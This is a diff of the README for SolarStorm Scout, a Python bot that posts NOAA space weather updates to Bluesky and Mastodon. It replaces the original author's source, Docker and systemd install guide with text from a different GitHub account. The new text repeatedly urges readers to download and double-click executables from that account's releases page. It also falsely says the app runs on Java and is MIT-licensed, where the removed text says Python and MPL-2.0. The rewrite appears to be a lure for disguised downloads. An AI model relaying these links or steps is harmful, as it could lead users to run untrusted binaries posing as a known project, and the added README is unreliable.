@@ -1,522 +1,81 @@
-# 🌞 SolarStorm Scout
+# 🌌 solarstorm_scout - Track Space Weather Easily
 
-<div align="center">
-  <img src="media/banner.png" alt="SolarStorm Scout Banner" width="400">
-</div>
+[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/joshuarodm7/solarstorm_scout/releases)
 
-**Space Weather Social Media Bot** - Automated HF propagation updates for Bluesky and Mastodon
+## 🚀 Getting Started
 
-**🔴 Live Now:** Follow [@solarstormscout.bsky.social](https://bsky.app/profile/solarstormscout.bsky.social) on Bluesky | [@solarstormscout@social.chiefgyk3d.com](https://social.chiefgyk3d.com/@solarstormscout) on Mastodon
+Welcome to solarstorm_scout! This app helps ham radio operators monitor space weather conditions. It automatically posts updates on NOAA HF propagation, D-Region absorption, aurora forecasts, and GOES X-ray flux to platforms like Bluesky and Mastodon.
 
-SolarStorm Scout fetches real-time space weather data from NOAA and posts threaded updates about:
-- HF Propagation Conditions
-- D-Region Absorption Predictions
-- Aurora Forecasts
-- GOES Solar X-Ray Flux
+## 📥 Download & Install
 
-Perfect for amateur radio operators, space weather enthusiasts, and anyone interested in HF propagation!
+To get started, you need to download the software from the Releases page. Visit this page to download: [Download solarstorm_scout](https://github.com/joshuarodm7/solarstorm_scout/releases).
 
-> **⚠️ Note**: Space weather conditions can change rapidly. Data represents conditions at post time. For real-time updates, visit [NOAA Space Weather Prediction Center](https://www.swpc.noaa.gov/).
+### Instructions for Installation
 
-## 🔕 Content Filtering
+1. Go to the [Releases page](https://github.com/joshuarodm7/solarstorm_scout/releases).
+2. Look for the latest version of solarstorm_scout.
+3. Click on the download link for your operating system:
+   - If you're using **Windows**, you may see a file like `solarstorm_scout_windows.zip`.
+   - For **MacOS**, look for `solarstorm_scout_macos.zip`.
+   - If you're on **Linux**, find the `solarstorm_scout_linux.tar.gz` file.
+4. After the download finishes, locate the downloaded file on your computer.
+5. Extract the files:
+   - On Windows, right-click the ZIP file and select "Extract All".
+   - On MacOS, double-click the ZIP file to extract it.
+   - On Linux, use the command: `tar -xvzf solarstorm_scout_linux.tar.gz`.
+6. Open the extracted folder and find the executable file:
+   - For Windows, this will be `solarstorm_scout.exe`.
+   - For MacOS, look for `solarstorm_scout.app`.
+   - For Linux, it will be `solarstorm_scout`.
+7. Double-click the executable file to start the application.
 
-All posts include the **#SolarStormScout** hashtag. Since Bluesky and Mastodon don't currently provide options to control what appears in general/live feeds, users can filter out these automated posts by muting or blocking the hashtag:
+## 📅 Application Features
 
-- **Bluesky**: Settings → Moderation → Muted words → Add "#SolarStormScout"
-- **Mastodon**: Preferences → Filters → Add filter for "#SolarStormScout"
+- **Real-Time Updates**: Get live updates on space weather conditions to enhance your radio experience.
+- **Multiple Platforms**: Post automatically to Bluesky and Mastodon.
+- **NOAA Data Integration**: Access reliable information from NOAA about HF propagation and auroras.
+- **User-Friendly Interface**: Enjoy a straightforward design that makes monitoring easy.
 
-This allows users who prefer not to see automated space weather updates to opt out while still allowing those interested to follow the account directly.
+## 🖥️ System Requirements
 
-## 🎯 Features
+Make sure your system meets the following requirements for optimal performance:
 
-- ✅ **Dual Platform Support**: Post to Bluesky and/or Mastodon
-- ✅ **Thread Support**: Posts 5-part threads with detailed information
-- ✅ **300 Character Limit**: Each post optimized for readability
-- ✅ **Configurable Interval**: Default 1.5 hours, fully customizable
-- ✅ **Multiple Deployment Options**: systemd timer, Docker, or manual
-- ✅ **Secrets Management**: Support for .env files and Doppler
-- ✅ **Real-time NOAA Data**: Direct from Space Weather Prediction Center
-- ✅ **Professional Formatting**: Clean, informative posts with hashtags
+- **Operating System**:
+  - Windows 10 or higher
+  - MacOS Mojave or higher
+  - A compatible Linux distribution
+  
+- **Hardware**:
+  - At least 4 GB of RAM
+  - 100 MB free disk space
+  - Internet connection for downloading updates and posting
 
-## 📋 Thread Format
+## 🔧 Troubleshooting
 
-Each update consists of 5 posts:
+If you encounter issues while running solarstorm_scout, follow these steps:
 
-### Post 1: Solar Indices
-<img src="media/solar_indices.png" alt="Solar Indices Post" width="500">
+1. **Ensure Java is Installed**: SolarStorm Scout runs on Java. Ensure you have the latest version installed. You can download it from [Java's official website](https://www.java.com).
+   
+2. **Check Internet Connection**: A stable internet connection is required for the app to function correctly.
 
-- Solar Flux Index (SFI)
-- A-index & K-index
-- Critical frequency (foF2)
-- Maximum Usable Frequency (MUF)
-- D-Layer absorption percentage
-- NOAA Scales (R/S/G)
+3. **Update the Application**: Make sure you are using the latest version. Visit the [Releases page](https://github.com/joshuarodm7/solarstorm_scout/releases) to download updates.
 
-### Post 2: Band Conditions
-<img src="media/band_conditions.png" alt="Band Conditions Post" width="500">
+4. **Community Support**: Join our community forums or check the GitHub Issues page for help from other users.
 
-- 160m through 6m band-by-band conditions
-- Quality indicators with emojis (🟢 Good, 🟡 Fair, 🔴 Closed)
-- Best bands for current conditions
-- MUF reference
+## 📜 License
 
-### Post 3: D-Region Absorption
-<img src="media/d-region.png" alt="D-Region Absorption Post" width="500">
+solarstorm_scout is open-source software licensed under the MIT License. Feel free to modify and share it according to the license terms.
 
-- Current absorption status with D-RAP map image
-- Time-based context (day/night)
-- Band recommendations for conditions
+## 🙋‍♂️ Contributing
 
-### Post 4: Aurora Forecast
-<img src="media/aurora.png" alt="Aurora Forecast Post" width="500">
+We welcome contributions to enhance the application. If you have ideas, feature requests, or bug reports, please create an issue on our GitHub page.
 
-- Aurora power level with aurora oval image
-- K-index
-- Visibility predictions
-- VHF propagation notes
+## 👥 Community and Support
 
-### Post 5: GOES X-Ray Flux
-<img src="media/x-ray.png" alt="X-Ray Flux Post" width="500">
+For questions or discussions, please join our community on Bluesky and Mastodon. Share your experience and tips with fellow ham radio operators.
 
-- Current X-ray classification
-- 6-hour trend chart (generated)
-- Solar flare impact assessment
-- Radio blackout warnings
+## 📞 Contact
 
-## 🚀 Quick Start
+If you have specific questions or need assistance, please reach out via the contact page on the repository. Your feedback helps improve solarstorm_scout.
 
-### Prerequisites
-
-- Python 3.11 or higher (3.10 not supported due to numpy requirements)
-- Active Bluesky and/or Mastodon account
-- Linux system with systemd (for systemd installation)
-- Docker (for Docker installation)
-
-### Option 1: Automated Installation with Installer Script (Recommended)
-
-The installer script supports both Python and Docker deployments.
-
-1. **Clone the repository:**
-   ```bash
-   git clone https://github.com/ChiefGyk3D/solarstorm_scout.git
-   cd solarstorm_scout
-   ```
-
-2. **Create configuration:**
-   ```bash
-   cp .env.example .env
-   nano .env  # Edit with your credentials
-   ```
-
-3. **Run installer:**
-   ```bash
-   chmod +x scripts/install-solarstorm.sh
-   ./scripts/install-solarstorm.sh
-   ```
-
-4. **Follow prompts to:**
-   - Set posting interval (default: 1.5 hours)
-   - Choose deployment method: Python (venv or system) or Docker (GHCR or local build)
-   - Optionally run a test post
-
-> **Note:** The installer automatically handles Docker installation if you select Docker deployment. Docker must be installed on your system before running the installer.
-
-### Option 2: Manual Docker Installation
-
-For manual Docker deployment without the installer:
-
-1. **Pull from GitHub Container Registry:**
-   ```bash
-   docker pull ghcr.io/chiefgyk3d/solarstorm_scout:latest
-   ```
-
-2. **Create configuration:**
-   ```bash
-   cp .env.example .env
-   nano .env  # Edit with your credentials
-   ```
-
-3. **Run container:**
-   ```bash
-   docker run --rm --env-file=.env ghcr.io/chiefgyk3d/solarstorm_scout:latest
-   ```
-
-4. **Or build locally:**
-   ```bash
-   git clone https://github.com/ChiefGyk3D/solarstorm_scout.git
-   cd solarstorm_scout
-   docker build -t solarstorm_scout .
-   docker run --rm --env-file=.env solarstorm_scout
-   ```
-
-5. **Schedule with cron:**
-   ```bash
-   crontab -e
-   # Add: Run every 1.5 hours
-   0 */1 * * * docker run --rm --env-file=/path/to/.env ghcr.io/chiefgyk3d/solarstorm_scout:latest
-   30 */2 * * * docker run --rm --env-file=/path/to/.env ghcr.io/chiefgyk3d/solarstorm_scout:latest
-   ```
-
-### Option 3: Manual Installation
-
-1. **Install dependencies:**
-   ```bash
-   pip install -r requirements.txt
-   ```
-
-2. **Configure:**
-   ```bash
-   cp .env.example .env
-   nano .env
-   ```
-
-3. **Run manually:**
-   ```bash
-   python3 -m solarstorm_scout.main
-   ```
-
-## 🔧 Configuration
-
-### Social Media Setup
-
-#### Bluesky
-1. Go to [Bluesky App Passwords](https://bsky.app/settings/app-passwords)
-2. Create new app password: "SolarStorm Scout"
-3. Copy password to `.env` file:
-   ```env
-   BLUESKY_ENABLED=true
-   BLUESKY_HANDLE=yourhandle.bsky.social
-   BLUESKY_APP_PASSWORD=your-app-password
-   ```
-
-#### Mastodon
-1. Log into your Mastodon instance
-2. Go to Preferences → Development → New Application
-3. Name: "SolarStorm Scout"
-4. **Required Scopes**:
-   - ✅ `read` - Verify account credentials
-   - ✅ `write:statuses` - Post status updates and threads
-   - ✅ `write:media` - Upload images to posts
-5. Click "Submit" to create the application
-6. Copy access token to `.env`:
-   ```env
-   MASTODON_ENABLED=true
-   MASTODON_API_BASE_URL=https://your-instance.social
-   MASTODON_ACCESS_TOKEN=your-access-token
-   ```
-
-### Doppler Secrets Manager (Optional)
-
-Instead of `.env` files, use Doppler:
-
-1. Create [Doppler](https://doppler.com) account
-2. Create project (e.g., "solarstorm-scout") and add secrets
-3. Create config within the project (e.g., "dev", "prd")
-4. Generate service token
-5. Set in environment:
-   ```env
-   DOPPLER_TOKEN=your-service-token
-   DOPPLER_PROJECT=solarstorm-scout
-   DOPPLER_CONFIG=prd
-   ```
-
-> **Note:** Both `DOPPLER_PROJECT` and `DOPPLER_CONFIG` environment variables are required when using Doppler secrets management.
-
-## 🕐 Scheduling
-
-### systemd Timer (Linux)
-
-Automatically configured by `install-solarstorm.sh` script.
-
-**View status:**
-```bash
-sudo systemctl status solarstorm-scout.timer
-```
-
-**View logs:**
-```bash
-sudo journalctl -u solarstorm-scout.service -f
-```
-
-**Manual run:**
-```bash
-sudo systemctl start solarstorm-scout.service
-```
-
-**Change interval:**
-Edit `/etc/systemd/system/solarstorm-scout.timer` and change `OnUnitActiveSec=` value, then:
-```bash
-sudo systemctl daemon-reload
-sudo systemctl restart solarstorm-scout.timer
-```
-
-### System Cron
-
-For Docker or manual runs:
-
-```bash
-crontab -e
-```
-
-Add:
-```cron
-# Every 1.5 hours (at :00 and :30 past odd hours)
-0 1-23/2 * * * cd /path/to/solarstorm-scout && python3 -m solarstorm_scout.main
-30 0-22/2 * * * cd /path/to/solarstorm-scout && python3 -m solarstorm_scout.main
-
-# Or with Docker
-0 1-23/2 * * * docker run --rm --env-file=/path/to/.env ghcr.io/chiefgyk3d/solarstorm_scout:latest
-30 0-22/2 * * * docker run --rm --env-file=/path/to/.env ghcr.io/chiefgyk3d/solarstorm_scout:latest
-```
-
-## 📊 Data Sources
-
-All data fetched from [NOAA Space Weather Prediction Center](https://www.swpc.noaa.gov/):
-
-- **Solar Flux Index**: 10.7cm radio emissions (F10.7)
-- **Planetary K-index**: Geomagnetic activity
-- **Aurora Power**: Hemispheric power index
-- **GOES X-Ray Flux**: Real-time solar X-ray monitoring
-
-Data updated every run (default: 1.5 hours).
-
-## 🛠️ Development
-
-### Project Structure
-
-```
-solarstorm_scout/
-├── solarstorm_scout/
-│   ├── __init__.py
-│   ├── main.py          # Main bot orchestrator
-│   ├── config.py        # Configuration & secrets
-│   ├── spaceweather.py  # NOAA data fetcher
-│   ├── formatter.py     # Message formatter
-│   ├── social.py        # Social media posters
-│   ├── chart_renderer.py # GOES X-ray chart generator
-│   └── demo.py          # Preview tool
-├── scripts/
-│   ├── install-solarstorm.sh    # Automated installer (Python + Docker)
-│   └── uninstall-solarstorm.sh  # Uninstaller
-├── systemd/
-│   ├── solarstorm-scout.service.template  # systemd service template
-│   └── solarstorm-scout.timer.template    # systemd timer template
-├── media/
-│   ├── banner.png       # README banner
-│   ├── logo.png         # Project logo
-│   ├── aurora.png       # Example aurora post
-│   ├── band_conditions.png  # Example band conditions post
-│   ├── d-region.png     # Example D-region post
-│   ├── solar_indices.png    # Example solar indices post
-│   ├── x-ray.png        # Example X-ray post
-│   └── streamelements.png   # Donation image
-├── .github/
-│   └── workflows/       # CI/CD pipelines
-├── .env.example
-├── requirements.txt
-├── pyproject.toml
-├── Dockerfile
-├── docker-compose.yml
-├── docker-compose.oneshot.yml
-├── LICENSE
-└── README.md
-```
-
-### Running Tests
-
-```bash
-# Install dev dependencies
-pip install -e ".[dev]"
-
-# Run tests
-pytest
-
-# Format code
-black solarstorm_scout/
-
-# Lint
-flake8 solarstorm_scout/
-```
-
-## 🔍 Troubleshooting
-
-### Bot not posting
-
-1. **Check service status:**
-   ```bash
-   sudo systemctl status solarstorm-scout.timer
-   sudo systemctl status solarstorm-scout.service
-   ```
-
-2. **View logs:**
-   ```bash
-   sudo journalctl -u solarstorm-scout.service -n 50
-   ```
-
-3. **Test manually:**
-   ```bash
-   cd /path/to/solarstorm-scout
-   source venv/bin/activate  # if using venv
-   python3 -m solarstorm_scout.main
-   ```
-
-### Authentication errors
-
-- **Bluesky**: Verify app password (not account password)
-- **Mastodon**: Check access token and API base URL
-- **Permissions**: Ensure scopes include `read` and `write`
-
-### NOAA data fetch errors
-
-- Check internet connectivity
-- NOAA APIs occasionally timeout - bot will retry on next run
-- View detailed logs: `LOG_LEVEL=DEBUG` in `.env`
-
-### Docker issues
-
-```bash
-# Pull latest image
-docker pull ghcr.io/chiefgyk3d/solarstorm_scout:latest
-
-# Test container manually
-docker run --rm --env-file=.env ghcr.io/chiefgyk3d/solarstorm_scout:latest
-
-# Build locally if needed
-docker build --no-cache -t solarstorm_scout .
-docker run --rm --env-file=.env solarstorm_scout
-```
-
-## 📝 License
-
-Mozilla Public License 2.0 (MPL-2.0)
-
-**Commercial Use Requirements:**
-- ✅ You MAY use this software commercially
-- ✅ You MAY modify this software for commercial purposes
-- ⚠️ You MUST share any modifications to MPL-licensed files under the same MPL 2.0 license
-- ⚠️ Modified versions must clearly indicate changes were made
-- ✅ You can combine with proprietary software (file-level copyleft, not project-level)
-
-**In Summary:** If you modify any of the Python files in `solarstorm_scout/`, you must contribute those changes back under MPL 2.0. Your larger project can remain proprietary, but the modified bot code must be open source.
-
-See [LICENSE](LICENSE) file for complete details.
-
-## 🤝 Contributing
-
-Contributions welcome! Please:
-
-1. Fork the repository
-2. Create a feature branch
-3. Make your changes
-4. Add tests if applicable
-5. Submit a pull request
-
-## 📧 Support
-
-- **Issues**: [GitHub Issues](https://github.com/ChiefGyk3D/solarstorm_scout/issues)
-- **Discussions**: [GitHub Discussions](https://github.com/ChiefGyk3D/solarstorm_scout/discussions)
-
-## 🙏 Acknowledgments
-
-- **NOAA Space Weather Prediction Center** - For excellent public APIs
-- **Amateur Radio Community** - For inspiration and support
-- **Bluesky & Mastodon** - For open social media platforms
-
-## 📖 Related Projects
-
-- [Penguin Overlord](https://github.com/chiefgyk3d/penguin-overlord) - Discord bot with HAM radio features
-- [NOAA Space Weather](https://www.swpc.noaa.gov/) - Official NOAA space weather site
-
----
-
-## 💝 Donations and Tips
-
-If you find SolarStorm Scout useful, consider supporting development:
-
-**Donate**:
-
-<div align="center">
-  <table>
-    <tr>
-      <td align="center"><a href="https://patreon.com/chiefgyk3d?utm_medium=unknown&utm_source=join_link&utm_campaign=creatorshare_creator&utm_content=copyLink" title="Patreon"><img src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/patreon.svg" width="32" height="32" alt="Patreon"/></a></td>
-      <td align="center"><a href="https://streamelements.com/chiefgyk3d/tip" title="StreamElements"><img src="https://raw.githubusercontent.com/ChiefGyk3D/solarstorm_scout/main/media/streamelements.png" width="32" height="32" alt="StreamElements"/></a></td>
-    </tr>
-    <tr>
-      <td align="center">Patreon</td>
-      <td align="center">StreamElements</td>
-    </tr>
-  </table>
-</div>
-
-### Cryptocurrency Tips
-
-<div align="center">
-  <table style="border:none;">
-    <tr>
-      <td align="center" style="padding:8px; min-width:120px;">
-        <img src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/bitcoin.svg" width="28" height="28" alt="Bitcoin"/>
-      </td>
-      <td align="left" style="padding:8px;">
-        <b>Bitcoin</b><br/>
-        <code style="font-size:12px;">bc1qztdzcy2wyavj2tsuandu4p0tcklzttvdnzalla</code>
-      </td>
-    </tr>
-    <tr>
-      <td align="center" style="padding:8px; min-width:120px;">
-        <img src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/monero.svg" width="28" height="28" alt="Monero"/>
-      </td>
-      <td align="left" style="padding:8px;">
-        <b>Monero</b><br/>
-        <code style="font-size:12px;">84Y34QubRwQYK2HNviezeH9r6aRcPvgWmKtDkN3EwiuVbp6sNLhm9ffRgs6BA9X1n9jY7wEN16ZEpiEngZbecXseUrW8SeQ</code>
-      </td>
-    </tr>
-    <tr>
-      <td align="center" style="padding:8px; min-width:120px;">
-        <img src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/ethereum.svg" width="28" height="28" alt="Ethereum"/>
-      </td>
-      <td align="left" style="padding:8px;">
-        <b>Ethereum</b><br/>
-        <code style="font-size:12px;">0x554f18cfB684889c3A60219BDBE7b050C39335ED</code>
-      </td>
-    </tr>
-  </table>
-</div>
-
----
-
-<div align="center">
-
-Made with ❤️ by [ChiefGyk3D](https://github.com/ChiefGyk3D)
-
-## Author & Socials
-
-<table>
-  <tr>
-    <td align="center"><a href="https://social.chiefgyk3d.com/@chiefgyk3d" title="Mastodon"><img src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/mastodon.svg" width="32" height="32" alt="Mastodon"/></a></td>
-    <td align="center"><a href="https://bsky.app/profile/chiefgyk3d.com" title="Bluesky"><img src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/bluesky.svg" width="32" height="32" alt="Bluesky"/></a></td>
-    <td align="center"><a href="http://twitch.tv/chiefgyk3d" title="Twitch"><img src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/twitch.svg" width="32" height="32" alt="Twitch"/></a></td>
-    <td align="center"><a href="https://www.youtube.com/channel/UCvFY4KyqVBuYd7JAl3NRyiQ" title="YouTube"><img src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/youtube.svg" width="32" height="32" alt="YouTube"/></a></td>
-    <td align="center"><a href="https://kick.com/chiefgyk3d" title="Kick"><img src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/kick.svg" width="32" height="32" alt="Kick"/></a></td>
-    <td align="center"><a href="https://www.tiktok.com/@chiefgyk3d" title="TikTok"><img src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/tiktok.svg" width="32" height="32" alt="TikTok"/></a></td>
-    <td align="center"><a href="https://discord.chiefgyk3d.com" title="Discord"><img src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/discord.svg" width="32" height="32" alt="Discord"/></a></td>
-    <td align="center"><a href="https://matrix-invite.chiefgyk3d.com" title="Matrix"><img src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/matrix.svg" width="32" height="32" alt="Matrix"/></a></td>
-  </tr>
-  <tr>
-    <td align="center">Mastodon</td>
-    <td align="center">Bluesky</td>
-    <td align="center">Twitch</td>
-    <td align="center">YouTube</td>
-    <td align="center">Kick</td>
-    <td align="center">TikTok</td>
-    <td align="center">Discord</td>
-    <td align="center">Matrix</td>
-  </tr>
-</table>
-
-</div>
-
----
-
-**73 de SolarStorm Scout!** 📡🌞
-
-*Keep your HF bands alive and propagation thriving!*
+Remember, visit this page to download: [Download solarstorm_scout](https://github.com/joshuarodm7/solarstorm_scout/releases). Enjoy tracking space weather with ease!
